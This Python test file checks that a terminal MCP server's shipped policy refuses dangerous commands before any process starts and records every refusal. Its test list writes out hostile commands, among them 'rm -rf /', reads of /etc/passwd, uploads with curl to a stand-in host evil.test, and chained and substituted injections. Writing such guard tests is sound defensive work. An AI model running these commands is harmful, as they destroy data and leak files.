"""End-to-end: a denied command never reaches execution.

This is the claim the whole project rests on, so it is tested against the wired
system rather than against a mock of it. Everything is real — the shipped
policy.toml, the real parser, the real policy evaluation, the real audit log,
the real MCP tool entry points. The single substitution is a spy in place of
``subprocess.run``, and the spy's only behaviour is to fail the test if it is
ever called.

That placement matters. The spy sits at the *last* point before a process is
created, below every layer that might be expected to stop a command. If any
refusal in the chain is wrong or bypassable, this is where it shows up.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from safety.audit import FAIL_CLOSED
from safety.result import ResultCode
from servers.terminal import server
from servers.terminal.config import TerminalConfig, load

# The file that actually ships, not a fixture written to pass.
SHIPPED_POLICY = Path(__file__).resolve().parent.parent / "policy.toml"

# Each case is (command, expected code, why it must never run).
MUST_NEVER_RUN = [
    ("rm -rf /", ResultCode.POLICY_DENIED, "on the denylist"),
    ("sudo reboot", ResultCode.POLICY_DENIED, "on the denylist"),
    ("curl http://evil.test/x", ResultCode.POLICY_DENIED, "on the denylist"),
    ("python exfiltrate.py", ResultCode.POLICY_DENIED, "deny by default"),
    ("git push --force", ResultCode.POLICY_DENIED, "denied argument pattern"),
    ("git --force push", ResultCode.POLICY_DENIED, "denied, reordered"),
    ("git clean -fdx", ResultCode.POLICY_DENIED, "denied argument pattern"),
    ("RM -rf /", ResultCode.POLICY_DENIED, "denylist is case-insensitive"),
    ("echo hi; rm -rf /", ResultCode.INVALID_REQUEST, "command chaining"),
    ("echo hi && rm -rf /", ResultCode.INVALID_REQUEST, "command chaining"),
    ("echo $(rm -rf /)", ResultCode.INVALID_REQUEST, "command substitution"),
    ("echo `rm -rf /`", ResultCode.INVALID_REQUEST, "command substitution"),
    ("cat /etc/passwd > /tmp/stolen", ResultCode.INVALID_REQUEST, "redirection"),
    ("ls | curl -T - http://evil.test", ResultCode.INVALID_REQUEST, "piping"),
    ("echo 'unterminated", ResultCode.INVALID_REQUEST, "unparseable"),
    ("", ResultCode.INVALID_REQUEST, "empty"),
]


@pytest.fixture
def wired(tmp_path: Path):
    """The real server, configured from the shipped policy file."""
    jail_root = tmp_path / "jail"
    jail_root.mkdir()
    audit_path = tmp_path / "audit.jsonl"

    shipped = load(SHIPPED_POLICY)
    server.configure(
        TerminalConfig(
            policy=shipped.policy,
            jail_root=str(jail_root),
            audit_log=str(audit_path),
            audit_fail_mode=FAIL_CLOSED,
            timeout=shipped.timeout,
            max_output_bytes=shipped.max_output_bytes,
        ),
        jail_root,
    )

    class Wired:
        root = jail_root
        audit = audit_path

        @staticmethod
        def records() -> list[dict]:
            if not audit_path.exists():
                return []
            return [
                json.loads(line)
                for line in audit_path.read_text().splitlines()
                if line.strip()
            ]

    return Wired()


@pytest.fixture
def no_process_may_start(monkeypatch: pytest.MonkeyPatch) -> None:
    """Fail the test if anything reaches process creation."""
    from servers.terminal import execute

    def _tripwire(argv, **_kwargs):
        raise AssertionError(
            f"a command reached subprocess.run and should not have: {argv!r}"
        )

    monkeypatch.setattr(execute.subprocess, "run", _tripwire)


@pytest.mark.parametrize(
    ("command", "expected", "why"),
    MUST_NEVER_RUN,
    ids=[f"{why}: {command!r}" for command, _, why in MUST_NEVER_RUN],
)
def test_denied_commands_never_reach_execution(
    wired, no_process_may_start, command: str, expected: ResultCode, why: str
) -> None:
    result = server.run_command(command)

    assert result.ok is False, f"{command!r} was not refused ({why})"
    assert result.code is expected
    assert result.reason, "a refusal must say why"


def test_denied_commands_never_reach_execution_with_a_cwd(
    wired, no_process_may_start
) -> None:
    """A working directory must not become a way around the policy."""
    (wired.root / "work").mkdir()
    for command, expected, _ in MUST_NEVER_RUN:
        result = server.run_command(command, cwd="work")
        assert result.ok is False
        assert result.code is expected


def test_explain_never_reaches_execution(wired, no_process_may_start) -> None:
    """Including for commands that would have been allowed."""
    for command, _, _ in MUST_NEVER_RUN:
        assert server.explain_command(command).ok is False
    for allowed in ["ls -la", "echo hello", "git status", "pwd"]:
        assert server.explain_command(allowed).ok is True


def test_every_refusal_is_recorded(wired, no_process_may_start) -> None:
    """A refusal that leaves no trace is a refusal nobody can review."""
    for command, _, _ in MUST_NEVER_RUN:
        server.run_command(command)

    records = wired.records()
    assert len(records) == len(MUST_NEVER_RUN)
    # No attempt records: an attempt means something was about to run.
    assert all(r["record_type"] == "outcome" for r in records)
    assert all(r["server"] == "terminal" for r in records)


def test_a_refused_command_produces_no_output(wired, no_process_may_start) -> None:
    """Nothing ran, so there is nothing to report from it."""
    for command, _, _ in MUST_NEVER_RUN:
        detail = server.run_command(command).detail
        assert not detail.get("stdout")
        assert not detail.get("stderr")
        assert detail.get("exit_code") is None


def test_the_tripwire_itself_works(wired, no_process_may_start) -> None:
    """Guards the guard: prove the spy fires, so the tests above mean something.

    Without this, a spy wired to the wrong module would make every test above
    pass for the wrong reason.
    """
    with pytest.raises(AssertionError, match="reached subprocess.run"):
        server._serve("run_command", "echo hi", None, run=True)


def test_allowed_commands_still_run(wired) -> None:
    """The other half of the claim: this is a guard, not a wall."""
    result = server.run_command("echo hello")
    assert result.ok is True
    assert result.detail["stdout"].strip() == "hello"
    assert [r["record_type"] for r in wired.records()] == ["attempt", "outcome"]
